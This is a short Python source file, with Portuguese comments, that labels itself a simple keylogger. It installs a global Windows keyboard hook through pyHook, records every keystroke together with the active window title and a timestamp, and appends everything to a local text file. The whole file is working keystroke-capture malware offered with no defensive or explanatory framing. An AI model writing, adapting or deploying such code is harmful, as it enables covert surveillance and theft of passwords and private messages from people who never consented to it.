#simples keylogger
#09-2019

import pythoncom, pyHook, datetime

window = None
dict = {
    'Numpad0':'0', 'Numpad1':'1', 'Numpad2':'2', 'Numpad3':'3', 'Numpad4':'4', 'Numpad5':'5', 'Numpad6':'6', 'Numpad7':'7', 'Numpad8':'8', 'Numpad9':'9',
    'Space':' ', 'Oem_102':'\\', 'Divide':'/', 'Multiply':'*', 'Oem_Period':'.', 'Oem_Comma':',', 'Oem_6':'[', 'Oem_5':']', 'Oem_3':'\'', 'Oem_Minus':'-',
    'Oem_Plus':'=', 'Add':'+', 'Subtract':'-', 'Oem_2':';', 'Return':'\n'
}
def capture_keyboard(event2):
    global window
    global dict
    k1 = '[JANELA] : ' + str(event2.WindowName)
    k2 = event2.Time
    k22 = ' #[DATA/HORA] : ' + str(datetime.datetime.fromtimestamp(k2))
    k3 = '[MESSAGE-NAME] : ' + str(event2.MessageName)
    k4 = str(event2.Key)
    diferenca = datetime.datetime.now()
    if window != event2.WindowName:
        data2 = '\n' + '----------------------------' + '\n| ' + k1 + k22 + ' |\n' + '----------------------------' + '\n'
        data3 = '| ' + k3 + '  |' + '\n| ' + str(diferenca) + ' |\n' + '----------------------------' + '\n'
        data4 = data2 + data3
        window = event2.WindowName
        writer(data4)
    data = k4
    if data in dict.keys():
        data = dict[data]
    writer(data)
    return True

def writer(recebe):
    global hkfile
    try:
        hkfile = open('hk-file.txt', 'a')
        hkfile.write(recebe)
    except:
        None
    hkfile.close()

phm = pyHook.HookManager()
phm.KeyDown = capture_keyboard
phm.HookKeyboard()
pythoncom.PumpMessages()

